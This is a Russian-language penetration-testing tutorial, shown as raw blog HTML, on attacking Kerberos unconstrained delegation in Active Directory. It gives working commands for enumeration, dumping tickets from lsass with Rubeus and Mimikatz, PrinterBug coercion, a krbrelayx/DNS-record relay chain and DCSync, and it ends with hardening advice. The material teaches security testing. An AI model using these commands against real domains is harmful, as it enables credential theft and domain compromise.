<!doctype html><html lang=ru dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование | Ardent101</title><meta name=keywords content="Active Directory,Kerberos,Pentest,Теория,Делегирование"><meta name=description content="Вступление Ранее уже было рассмотрено устройство протокола Kerberos и некоторые классические атаки с его использованием в Active Directory. Теперь рассмотрим еще один вид атак на Active Directory, связанный с неограниченным делегированием при помощи Kerberos.
Общая теория Делегирование - механизм предоставления одному сервису доступа к другому сервису от имени заданного пользователя.
Определение может показаться не очень понятным. Рассмотрим классический пример, когда целесообразно использовать делегирование. Представим, что пользователь прошел аутентификацию по протоколу Kerberos к внутреннему веб-порталу, предоставляющему интерфейс для работы с базой данных, функционирующей на другом сервере."><meta name=author content="Ardent101"><link rel=canonical href=https://ardent101.github.io/posts/kerberos_delegation/><link crossorigin=anonymous href=/assets/css/stylesheet.min.d6ed90c28450051e5bafcc0bf4bfe033ff2b04454909211dc9e97b8a50525621.css integrity="sha256-1u2QwoRQBR5br8wL9L/gM/8rBEVJCSEdyel7ilBSViE=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ardent101.github.io/static/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ardent101.github.io/static/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ardent101.github.io/static/favicon-32x32.png><link rel=apple-touch-icon href=https://ardent101.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://ardent101.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование"><meta property="og:description" content="Вступление Ранее уже было рассмотрено устройство протокола Kerberos и некоторые классические атаки с его использованием в Active Directory. Теперь рассмотрим еще один вид атак на Active Directory, связанный с неограниченным делегированием при помощи Kerberos.
Общая теория Делегирование - механизм предоставления одному сервису доступа к другому сервису от имени заданного пользователя.
Определение может показаться не очень понятным. Рассмотрим классический пример, когда целесообразно использовать делегирование. Представим, что пользователь прошел аутентификацию по протоколу Kerberos к внутреннему веб-порталу, предоставляющему интерфейс для работы с базой данных, функционирующей на другом сервере."><meta property="og:type" content="article"><meta property="og:url" content="https://ardent101.github.io/posts/kerberos_delegation/"><meta property="og:image" content="https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-08-31T11:30:03+00:00"><meta property="article:modified_time" content="2022-08-31T11:30:03+00:00"><meta property="og:site_name" content="Ardent101"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo.png"><meta name=twitter:title content="Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование"><meta name=twitter:description content="Вступление Ранее уже было рассмотрено устройство протокола Kerberos и некоторые классические атаки с его использованием в Active Directory. Теперь рассмотрим еще один вид атак на Active Directory, связанный с неограниченным делегированием при помощи Kerberos.
Общая теория Делегирование - механизм предоставления одному сервису доступа к другому сервису от имени заданного пользователя.
Определение может показаться не очень понятным. Рассмотрим классический пример, когда целесообразно использовать делегирование. Представим, что пользователь прошел аутентификацию по протоколу Kerberos к внутреннему веб-порталу, предоставляющему интерфейс для работы с базой данных, функционирующей на другом сервере."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ardent101.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование","item":"https://ardent101.github.io/posts/kerberos_delegation/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование","name":"Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование","description":"Вступление Ранее уже было рассмотрено устройство протокола Kerberos и некоторые классические атаки с его использованием в Active Directory. Теперь рассмотрим еще один вид атак на Active Directory, связанный с неограниченным делегированием при помощи Kerberos.\nОбщая теория Делегирование - механизм предоставления одному сервису доступа к другому сервису от имени заданного пользователя.\nОпределение может показаться не очень понятным. Рассмотрим классический пример, когда целесообразно использовать делегирование. Представим, что пользователь прошел аутентификацию по протоколу Kerberos к внутреннему веб-порталу, предоставляющему интерфейс для работы с базой данных, функционирующей на другом сервере.","keywords":["Active Directory","Kerberos","Pentest","Теория","Делегирование"],"articleBody":"Вступление Ранее уже было рассмотрено устройство протокола Kerberos и некоторые классические атаки с его использованием в Active Directory. Теперь рассмотрим еще один вид атак на Active Directory, связанный с неограниченным делегированием при помощи Kerberos.\nОбщая теория Делегирование - механизм предоставления одному сервису доступа к другому сервису от имени заданного пользователя.\nОпределение может показаться не очень понятным. Рассмотрим классический пример, когда целесообразно использовать делегирование. Представим, что пользователь прошел аутентификацию по протоколу Kerberos к внутреннему веб-порталу, предоставляющему интерфейс для работы с базой данных, функционирующей на другом сервере. Далее пользователь при помощи указанного интерфейса желает получить выгрузку определенных данных и вот тут возникает, так называемая, “проблема двойного прыжка Kerberos”. Пользователь должен получить доступ не ко всем данным, а только к тем для которых у него есть разрешение.\n\r\r\rИллюстрация проблемы \"двойного прыжка\" Kerberos\r\r\rБытовой пример: когда Вы через портал Госуслуг запрашиваете штрафы в ГИБДД, Вам приходят только Ваши собственные штрафы, но не штрафы других людей.\nПроблема заключается в том, что пользователь авторизован только на веб-сервере и ничего не знает о существовании сервера базы данных. Веб-сервер не может использовать полученный от пользователя TGS-билет для обращения к базе данных, потому что TGS-билет, как было рассмотрено ранее, предназначен только для доступа к конкретному сервису.\nДелегирование решает рассмотренную проблему и позволяет веб-серверу обратиться к серверу базы данных от имени аутентифицированного пользователя.\nПрежде чем перейти к дальнейшему обсуждению устройства делегирования, следует поподробнее разобрать один момент, который был не так важен в предыдущих статьях, но теперь имеет значение.\nУчетные записи в Active Directory бывают разных типов, в частности можно выделить:\n Пользовательские учетные записи - предназначаются для “живых” людей или для решения служебных задач, например резервного копирования. Машинные учетные записи - создаются автоматически при добавлении компьютера в домен. Отличить их можно по знаку $ в конце имени. Если посмотреть схему Active Directory, то будет видно, что машинная учетная запись является подклассом обычной учетной записи. Таким образом компьютеры тоже пользователи, но со своей спецификой.  Сервис в Active Directory - процесс, работающий в контексте учетной записи своего владельца на каком-то определенном компьютере (сервере). Обычно владельцем сервиса является машинная учетная запись компьютера на котором сервис запущен, но иногда владельцем является пользовательская учетная запись. Заметим, что процесс сервиса обладает правами и привилегиями владельца сервиса.\nКроме того важно отметить, что у учетных записей есть атрибут servicePrincipalName в котором перечисляются имена сервисов (SPN), владельцами которых являются указанные учетные записи.\n\r\r\rПример содержимого атрибута servicePrincipalName\r\r\rВот здесь проявляется одно из отличий между пользовательскими и машинными учетными записями. Дело в том, что самостоятельно изменить значение своего атрибута servicePrincipalName пользовательская учетная запись не может. Для изменения у учетной записи атрибута servicePrincipalName необходимо обладать разрешением Validated-SPN в отношении указанной учетной записи, а такое разрешение по умолчанию выдается административным учетным записям, а также машинными учетными записям в отношении своего собственного атрибута. То есть, машинная учетная запись по умолчанию может изменять свой собственный атрибут servicePrincipalName, а пользовательская нет.\nЕще один атрибут учетной записи про который хочется сказать - UserAccountControl (не путать с механизмом контроля учетных записей). Этот атрибут хранит некоторые настройки учетной записи и по сути представляет собой битовую маску, хранимую в виде числа. Для изменения указанного атрибута требуется привилегия SeEnableDelegation, которой по умолчанию обладают только учетные записи с правами уровня администратора домена.\n\r\r\rСодержимое вкладки Account в ADUC\r\r\r\r\r\rПеречень флагов, содержащихся в атрибуте UserAccountControl\r\r\rИстория и виды делегирования Можно выделить следующие виды делегирования в Active Directory:\n Неограниченное (Windows 2000 Server) Ограниченное (Windows 2003 Server)  с использованием только Kerberos (S4U2Proxy) c использованием любого протокола (S4U2Self + S4U2Proxy)   Делегирование на основе ресурсов (Windows Server 2012 | S4U2Self + S4U2Proxy)  S4U2Self и S4U2Proxy - расширения протокола Kerberos, специально внедренные для поддержки возможности ограниченного делегирования. Подробнее указанные расширения будут рассмотрены в последующих статьях цикла.\nУстройство неограниченного делегирования Изначально в Windows Server 2000 появилось и было доступно только неограниченное делегирование.\nСервис, обладающий правом на неограниченное делегирование, может обратиться к любому другому сервису от имени практически любого пользователя.\n\r\r\rОбщая схема неограниченного делегирования\r\r\rПочему практически? Дело в том, что у учетной записи пользователя может быть установлен флаг NOT_DELEGATED в атрибуте UserAccountControl, запрещающий олицетворение указанного пользователя.\nПо умолчанию флаг NOT_DELEGATED отключен и устанавливается либо при активации опции “Account is sensitive and cannot be delegated”, либо при добавлении пользователя в группу “Protected Users”.\n Примечание: среди прочего члены группы “Protected Users” также не могут аутентифицироваться по NTLM, использовать DES или RC4 шифрование в Kerberos, обновлять TGT по истечении 4 часов и кэшировать учетные данные для входа в домен.\n Чтобы учетная запись получила право на неограниченное делегирование в атрибуте UserAccountControl указанной учетной записи необходимо установить флаг TRUSTED_FOR_DELEGATION, которому соответствует целочисленное значение 524288. По умолчанию указанный флаг активен только у машинных учетных записей контроллеров домена.\n\r\r\rПример: у учетной записи \"SQLSvc\" включено неограниченное делегирование\r\r\rДля изменения значения флага необходимо наличие привилегии SeEnableDelegationPrivilege, которой изначально обладают только учетные записи с правами уровня администратора домена.\nТеперь рассмотрим, как устроен процесс неограниченного делегирования.\n\r\r\rОбщая схема неограниченного делегирования\r\r\r\r\r\rПример сетевого трафика при неограниченном делегировании. Взят с attl4s.github.io\r\r\rРазбор по шагам:\nПодразумевается, что учетная запись User не является чувствительной к делегированию и не состоит в группе защищенных пользователей (флаг NOT_DELEGATED не активен). Сначала User, как уже было рассмотрено ранее, получает TGT в результате обмена KRB AS REQ и KRB AS REP сообщениями. Далее User запрашивает TGT-билет для доступа к Сервису А (KRB TGS REQ). KDC видит, что у Сервиса А установлен флаг “TRUSTED_FOR_DELEGATION”, разрешающий неограниченную делегацию, и поэтому в ответ User KDC отправляет TGS-билет с флагом ok-as-delegate. Получив TGS-билет, User обнаруживает флаг ok-as-delegate и понимает, что ему необходимо передать свои учетные данные Сервису А. Для этого User снова обращается к KDC c просьбой выдать ему перенаправляемый (forwarded) TGT. KDC выполняет необходимые проверки и отправляет User TGT с правом передачи. User обращается к Сервису А с немного расширенным KRB AP REQ сообщением. Теперь в аутентификаторе содержится не только метка времени и принципал клиента, но и перенаправляемый (forwarded) TGT вместе с сессионным ключом для общения с KDC. Сервис А извлекает сессионный ключ для общения с User из TGS-билета, расшифровывает аутентификатор, выполняет проверки и сохраняет Forwarded TGT для User вместе с соответствующим указанному билету сессионным ключом. С использованием полученных аутентификационных данных Сервис А получает TGS-билет к Сервису Б от имени User.  Общая схема атаки при неограниченном делегировании Прежде чем приступить к конкретным реализациям атак, рассмотрим общий принцип и идею их проведения.\nУсловие для проведения атаки: владение учетной записью, обладающей неограниченным делегированием.\nРезультат успешной атаки: захват учетных записей, в том числе возможно административных, прошедших аутентификацию к сервису с настроенным неограниченным делегированием.\nИзначально у атакующего имеется учетная запись с неограниченным делегированием. У учетной записи есть сервис, а сервис предполагает работу в рамках процесса операционный системы. Указанная система сохраняет Forwarded TGT доменных учетных записей, прошедших аутентификацию к сервису. Атака заключается в добыче Forwarded TGT для последующей атаки Pass-the-ticket. Важно понимать, что добытый Forwarded TGT можно использовать для доступа к любому сервису от имени соответствующего пользователя, так как делегирование неограниченное.\n\r\r\rОбщая схема атаки с использованием неограниченного делегирования\r\r\rПрактика Перейдем к реализациям атак с использованием неограниченного делегирования на практике. Рассмотрим основные этапы атак, а также различные варианты их проведения.\nПоиск учетных записей с неограниченным делегированием Несмотря на то, что для реализации атак уже подразумевается обладание учетной записью с неограниченным делегированием, а подробный разбор способов получения указанной учетной записи выходит за рамки материала, полезно рассмотреть предварительный этап с разведкой.\nСуществует множество инструментов, позволяющих выявить учетные записи с неограниченным делегированием.\nВариант 1 - с помощью PowerShell модуля ADSI для работы с Active Directory\nПоиск среди всех учетных записей\n([adsisearcher]'(userAccountControl:1.2.840.113556.1.4.803:=524288)').FindAll() Вариант 2 - с помощью FindDelegation.py, входящего в Impacket\nПоиск среди всех учетных записей\nfindDelegation.py -dc-ip $DC_IP $Domain_fqdn/$Username:$Password Вариант 3 - PowerView\nПоиск среди учетных записей класса компьютер\nGet-DomainComputer -Unconstrained Поиск среди пользовательских учетных записей\nGet-DomainUser -TrustedToAuth  Примечание: существует py-аналог PowerView для Linux\n Вариант 4 - Bloodhound\nПоиск среди учетных записей класса компьютер:\nmatch (c:Computer {unconstraineddelegation:true}) return c.name Поиск среди пользовательских учетных записей:\nmatch (u:User {unconstraineddelegation:true}) return u.name Вариант 5 - Ldapdomaindump после Relay\nВсе приведенные выше способы требовали наличия прав пользователя, но также можно провести Relay атаку по протоколу LDAP на контроллер домена с последующим использованием Ldapdomaindump:\ngrep TRUSTED_FOR_DELEGATION domain_computers.grep grep TRUSTED_FOR_DELEGATION domain_users.grep Атака “Извлечение из памяти сервера” Условие для проведения атаки: доступ с правами локального администратора к серверу с настроенным неограниченным делегированием.\nНекоторые варианты выполнения условия:\n В результате эксплуатации критической уязвимости (получаем административный доступ к системе) Извлечь NT-хэш машинной учетной записи из недавней резервной копии (пароли автоматически сменяются каждые 30 дней) В результате понижения версии протокола NTLMv2 до NTLMv1 с последующим перебором пароля к машинной учетной записи по радужным таблицам  Результат успешной атаки: доступ к учетной записи, обладающей правами уровня администратора домена.\nПолучив административный доступ к серверу с сервисом, обладающим неограниченным делегированием, атакующий может извлечь TGT учетных записей, проходивших аутентификацию к указанному сервису, из памяти процесса lsass.exe сервера.\nОсуществить выгрузку можно с помощью Rubeus:\nRubeus.exe dump /service:krbtgt /nowrap Или при помощи Mimikatz:\nmimikatz # sekurlsa::tickets /export Полученные TGT можно использовать для проведения атаки Pass-the-Ticket.\nСтатья с примером реализации атаки.\nPrinterBug (SpoolService / MS-RPRN RPC) Но что делать, если среди учетных записей прошедших аутентификацию к сервису имеются только непривилегированные учетные записи обычных пользователей домена?\nНа помощь приходит еще один вид атак - “принудительная аутентификация”. Идея заключается в том, чтобы заставить атакуемую учетную запись пройти аутентификацию к подконтрольному сервису.\nНа настоящий момент известно несколько реализаций атак, направленных на принудительную аутентификацию. Более того, в последнее время появляются и новые способы, но нельзя объять необъятное. Описание всех вариантов принудительной аутентификации является предметом отдельной статьи, а может даже и не одной. Тем не менее рассмотрим и обозначим некоторые наиболее известные подходы.\nЛюбая прошедшая проверку подлинности в домене учетная запись может удаленно подключиться к сервису печати контроллера домена и запросить обновление очереди на печать с последующим уведомлением подконтрольной системы. Таким образом можно заставить компьютер с включенным сервисом печати пройти аутентификацию к указанной системе.\n По умолчанию сервис печати на контроллере домена включен.\n Проверить наличие сервиса печати можно при помощи следующей команды:\nls \\\\dc01\\pipe\\spoolss Запуск отслеживания принятых билетов с фильтрацией по конкретному отправителю:\nRubeus.exe monitor /interval:5 /filteruser:DC$ Провоцирование аутентификации с использованием PrinterBug:\nSpoolSample.exe $DC $Host Конвертирование полученной base64-строки в билет формата kirbi:\n[IO.File]::WriteAllBytes(\"C:\\fullpathtoticket.kirbi\", [Convert]::FromBase64String(\"aa…\")) Конвертирование полученного в формате kirbi билета в ccache для дальнейшего использования в Linux:\nticketConverter.py $ticket.kirbi $ticket.ccache Добавление билета в среду окружения:\nexport KRB5CCNAME=/path/to/ticket.ccache Полученный TGT машинной учетной записи контроллера домена можно использовать для получения доступа к контроллеру домена или выполнения атаки DCSync:\nsecretsdump.py -k -no-pass $Domain_FQDN/$Username@$DC_FQDN Статья с примером реализации атаки.\nНекоторые способы принудительной аутентификации Ключевые слова для самостоятельного изучения:\n PetitPotam (EfsRpcOpenFileRaw / MS-EFSRPC) PrivExchange ShadowCoerce DFSCoerce WebDAV  Полезное программное средство\nАтака с использованием учетной записи без сервера Условие для проведения атаки: пароль или ключ Kerberos учетной записи, обладающей правом на неограниченное делегирование.\nНекоторые варианты выполнения условия:\n Пароль к пользовательской учетной записи может быть получен в результате атаки Kerberoasting или подобран оффлайн в результате перехвата Net-NTLMv2 хэша NT хэш пароля к машинной учетной записи может быть извлечен из базы SAM при наличии прав локального администратора Пароли (NT хэши) могут быть также извлечены из памяти какого-то сервера или рабочей станции  Результат успешной атаки: доступ к учетной записи, обладающей правами уровня администратора домена.\nС ходу может быть не очень понятно, в чем заключается различие в условиях по сравнению с предыдущей атакой. Дело в том, что ранее подразумевалось наличие у атакующего доступа к серверу вместе с сервисом, то есть к процессу, способному обслуживать запросы пользователей. В рассматриваемом сейчас случае у атакующего нет доступа к серверу, но есть только “бестелесная” учетная запись. Особенно это условие актуально в случае пользовательской учетной записи. Проблема заключается в том, что негде принимать запросы на аутентификацию и неоткуда извлекать TGT.\nРешение было предложено в статье “Relaying Kerberos - Having fun with unconstrained delegation” за авторством Dirk-jan Mollema. Идея заключается в том, чтобы принудить атакуемые учетные записи пройти аутентификацию к подконтрольной системе, функционирующей не в составе домена, с сервисом, работающим в контексте скомпрометированной учетной записи, обладающей неограниченным делегированием.\nНачнем по порядку разбираться, как организовать все необходимое для проведения атаки.\n  Злонамеренный сервис. Для корректной работы сервиса и извлечения из принятого KRB_AP_REQ сообщения Forwarded TGT клиента требуется знать ключ Kerberos учетной записи владельца указанного сервиса. Как формируется ключ учетной записи уже было рассмотрено ранее. Важно отметить, что, как правило, в зависимости от класса учетной записи используются разные алгоритмы. Для машинных учетных записей необходим AES256-ключ, а для пользовательских учетных записей нужен NT-хэш (для RC4), но в любом случае достаточно знания пароля и соли.\n  Заманивание клиента. Теперь необходимо заставить клиента обратиться к злонамеренному сервису, чтобы передать свой Forwarded TGT. Известно несколько способов, как это осуществить, среди прочего можно выделить: 2.1 Атаки, направленные на перехват сетевого трафика (WPAD, MITM6, LLMNR/NBNS, ARP-spoofing, отравление DNS записей)\n2.2 Социальная инженерия (ярлыки, письма, файлы со специальным UNC-путем - пример)\n2.3 Третий предпочтительный способ, о котором пойдет речь дальше.\n  У сервиса должно быть имя, то есть SPN. У SPN предусмотрено поле “host” (см. ранее), содержащее доменное имя хоста на котором работает сервис. За сопоставление доменного имени IP-адресу отвечает DNS-сервер. В связи с изложенным получается, что атакующему требуется, чтобы при обращении к доменному имени хоста, содержащегося в SPN сервиса, клиент получил в ответ IP-адрес злонамеренной подконтрольной системы. Как спровоцировать клиента осуществить обращение было рассмотрено в предыдущей версии атаки. Теперь рассмотрим, как получить SPN с “host” для которого DNS запись содержит IP-адрес системы атакующего.\nДля машинных учетных записей все относительно просто. Дело в том, что указанные учетные записи самостоятельно могут добавлять себе SPN. Более того, по умолчанию каждая учетная запись в домене может добавлять новые DNS-записи.\nВ итоге соберем всё вместе на практике.\nСначала определяемся со способом принудительной аутентификации. Важно понимать, что принудительная аутентификация работает только для определенных service-name (см. ранее про SPN). Представим, что доступны две альтернативы: PrinterBug и PrivExchange. Если выбираем PrinterBug, то так как аутентификация будет осуществляться по SMB создаем сервис c service-name “HOST” (не путать с полем), если выбираем PrivExchange, то в качестве service-name задаем “HTTP”.\naddspn.py -u 'DOMAIN\\CompromisedAccont' -p 'LMhash:NThash' -s 'service-name/attacker.DOMAIN_FQDN' 'DomainController' --additional У созданной SPN добавляем DNS-запись для HOST с указанием IP-адреса системы атакующего:\ndnstool.py -u 'DOMAIN\\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController' Запускаем на подконтрольной системе злонамеренный сервис:\nkrbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password' Осуществляем принудительную аутентификацию, например:\nSpoolSample.exe $DC $Host Для пользовательских учетных записей ситуация обстоит сложнее. Указанные учетные записи не могут редактировать свои SPN. Возможные варианты решения:\n Проверить имеющиеся в SPN сервисы на предмет наличия host с отсутствующими DNS записями. Сделать это можно при помощи обычного nslookup. Если указанные записи присутствуют, то тогда для них можно самостоятельно создать DNS с нужным IP-адресом. Добыть учетную запись, обладающую соответствующими правами на добавление SPN в отношении имеющейся учетной записи с неограниченным делегированием.  Далее все происходит аналогично случаю с машинной учетной записью.\n Рассмотренный способ проведения атаки также примечателен тем, что не требует удаленного запуска кода на стороннем сервере. Таким образом нет необходимости обходить имеющиеся на указанном сервере средства защиты.\n Статья с примером реализации атаки.\nОбщая схема вариантов проведения атак Исследователь Charlie Bromberg составил следующую полезную схему, обобщающую рассмотренные варианты атак:\n\r\r\rОбщая схема с вариантами атак при неограниченном делегировании\r\r\rРекомендации  Провести инвентаризацию домена на предмет наличия учетных записей с неограниченным делегированием. Следует минимизировать использование неограниченного делегирования и перейти к механизмам ограниченного делегирования. В случае невозможности перехода рекомендуется рассматривать серверы, на которых функционирует сервисы с неограниченным делегированием, как особо защищаемые объекты, компрометация которых приводит к компрометации всего домена. Добавить критически важные учетные записи домена в группу Protected Users или активировать опцию “Account is sensitive and cannot be delegated” в атрибутах указанных учетных записей. Ограничить возможность добавления машинных учетных записей в домен для непривилегированных пользователей. Установить атрибут ms-DS-MachineAccountQuota равным нулю у указанных пользователей. Противодействовать атакам, направленным на принудительную аутентификацию:  Отключить неиспользуемую службу печати на контроллерах домена Установить актуальные обновления безопасности Ограничить сетевое взаимодействие   По возможности назначать владельцами сервисов выделенные пользовательские учетные записи. Обеспечить сложность и периодическую сменяемость паролей к указанными учетным записям.  Используемые источники  Фундаментальная статья, заложившая основы для атак на делегирование: “Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory” от Elad Shamir Отличный доклад про делегацию в Kerberos: “You Do (Not) Understand Kerberos Delegation” от Daniel López Jiménez (видео и презентация) Доклад “Delegating Kerberos to bypass Kerberos delegation limitation” от Charlie Bromberg (видео и презентация) Материалы с Hacker Recipes от Charlie Bromberg (Shutdown) Статья: “Kerberos (III): How does delegation work?” от Eloy Pérez Посты из телеграмм канала “СyberSecrets”  Скриншот с возможными флагами атрибута UserAccountControl сделан с сайта jigsolving.com.\nСкриншот с SPN взят из статьи “Service Principal Name (SPN)” за авторством Pixis.\n","wordCount":"2663","inLanguage":"ru","image":"https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo.png","datePublished":"2022-08-31T11:30:03Z","dateModified":"2022-08-31T11:30:03Z","author":{"@type":"Person","name":"Ardent101"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://ardent101.github.io/posts/kerberos_delegation/"},"publisher":{"@type":"Organization","name":"Ardent101","logo":{"@type":"ImageObject","url":"https://ardent101.github.io/static/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ardent101.github.io/ accesskey=h title="Главная (Alt + H)"><img src=https://ardent101.github.io/apple-touch-icon.png alt=logo aria-label=logo height=35>Главная</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://ardent101.github.io/archives/ title=Архив><span>Архив</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование</h1><div class=post-meta><span title="2022-08-31 11:30:03 +0000 +0000">августа 31, 2022</span>&nbsp;·&nbsp;13 мин&nbsp;·&nbsp;Ardent101</div></header><figure class=entry-cover><img loading=lazy srcset="https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo_hub0eee8214e05a0d1924b8cf822a66d05_787816_360x0_resize_box_3.png 360w ,https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo_hub0eee8214e05a0d1924b8cf822a66d05_787816_480x0_resize_box_3.png 480w ,https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo_hub0eee8214e05a0d1924b8cf822a66d05_787816_720x0_resize_box_3.png 720w ,https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo_hub0eee8214e05a0d1924b8cf822a66d05_787816_1080x0_resize_box_3.png 1080w ,https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo.png 1201w" sizes="(min-width: 768px) 720px, 100vw" src=https://ardent101.github.io/posts/kerberos_delegation/images/unconstrained_logo.png alt width=1201 height=495></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Оглавление</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#вступление>Вступление</a></li><li><a href=#общая-теория>Общая теория</a><ul><li><a href=#история-и-виды-делегирования>История и виды делегирования</a></li><li><a href=#устройство-неограниченного-делегирования>Устройство неограниченного делегирования</a></li><li><a href=#общая-схема-атаки-при-неограниченном-делегировании>Общая схема атаки при неограниченном делегировании</a></li></ul></li><li><a href=#практика>Практика</a><ul><li><a href=#поиск-учетных-записей-с-неограниченным-делегированием>Поиск учетных записей с неограниченным делегированием</a></li><li><a href=#атака-извлечение-из-памяти-сервера>Атака &ldquo;Извлечение из памяти сервера&rdquo;</a></li><li><a href=#атака-с-использованием-учетной-записи-без-сервера>Атака с использованием учетной записи без сервера</a></li><li><a href=#общая-схема-вариантов-проведения-атак>Общая схема вариантов проведения атак</a></li><li><a href=#рекомендации>Рекомендации</a></li></ul></li><li><a href=#используемые-источники>Используемые источники</a></li></ul></nav></div></details></div><div class=post-content><h2 id=вступление>Вступление<a hidden class=anchor aria-hidden=true href=#вступление>#</a></h2><p><a href=/posts/kerberos_theory/>Ранее</a> уже было рассмотрено устройство протокола Kerberos и <a href=/posts/kerberos_general_attacks/>некоторые классические атаки</a> с его использованием в Active Directory. Теперь рассмотрим еще один вид атак на Active Directory, связанный с неограниченным делегированием при помощи Kerberos.</p><h2 id=общая-теория>Общая теория<a hidden class=anchor aria-hidden=true href=#общая-теория>#</a></h2><p><strong>Делегирование</strong> - механизм предоставления одному сервису доступа к другому сервису от имени заданного пользователя.</p><p>Определение может показаться не очень понятным. Рассмотрим классический пример, когда целесообразно использовать делегирование. Представим, что пользователь прошел аутентификацию по протоколу Kerberos к внутреннему веб-порталу, предоставляющему интерфейс для работы с базой данных, функционирующей на другом сервере. Далее пользователь при помощи указанного интерфейса желает получить выгрузку определенных данных и вот тут возникает, так называемая, &ldquo;проблема двойного прыжка Kerberos&rdquo;. Пользователь должен получить доступ не ко всем данным, а только к тем для которых у него есть разрешение.</p><p><figure><img src=images/double_hop_problem.svg alt=double_hop_problem><figcaption><p style=text-align:center>Иллюстрация проблемы "двойного прыжка" Kerberos</p></figcaption></figure></p><p>Бытовой пример: когда Вы через портал Госуслуг запрашиваете штрафы в ГИБДД, Вам приходят только Ваши собственные штрафы, но не штрафы других людей.</p><p>Проблема заключается в том, что пользователь авторизован только на веб-сервере и ничего не знает о существовании сервера базы данных. Веб-сервер не может использовать полученный от пользователя TGS-билет для обращения к базе данных, потому что TGS-билет, как было рассмотрено <a href=/posts/kerberos_theory/#krb_tgs_rep>ранее</a>, предназначен только для доступа к конкретному сервису.</p><p>Делегирование решает рассмотренную проблему и позволяет веб-серверу обратиться к серверу базы данных от имени аутентифицированного пользователя.</p><p>Прежде чем перейти к дальнейшему обсуждению устройства делегирования, следует поподробнее разобрать один момент, который был не так важен в предыдущих статьях, но теперь имеет значение.</p><p><strong>Учетные записи</strong> в Active Directory бывают разных типов, в частности можно выделить:</p><ul><li><em>Пользовательские учетные записи</em> - предназначаются для &ldquo;живых&rdquo; людей или для решения служебных задач, например резервного копирования.</li><li><em>Машинные учетные записи</em> - создаются автоматически при добавлении компьютера в домен. Отличить их можно по знаку $ в конце имени. Если посмотреть схему Active Directory, то будет видно, что машинная учетная запись является подклассом обычной учетной записи. Таким образом компьютеры тоже пользователи, но со своей спецификой.</li></ul><p><strong>Сервис</strong> в Active 